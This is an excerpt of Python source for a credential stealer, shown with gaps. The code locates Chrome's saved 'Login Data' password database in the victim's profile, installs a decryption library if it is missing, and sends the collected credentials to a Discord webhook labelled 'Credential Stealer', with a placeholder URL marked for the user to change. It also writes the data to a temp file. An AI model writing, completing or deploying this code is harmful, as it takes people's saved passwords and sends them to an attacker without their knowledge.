...
try:
    ...
    print("pycryptodome module not found. Installing...")
...
def stealcreds():
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
...
webhook = DiscordWebhook(url=WEBHOOK, username="Credential Stealer", content=f"Chrome Credentials from: {getUsername()}")  # CHANGE ME!!!

try:
    data = stealcreds()
    path = os.path.join(os.environ["TEMP"], "data.json")
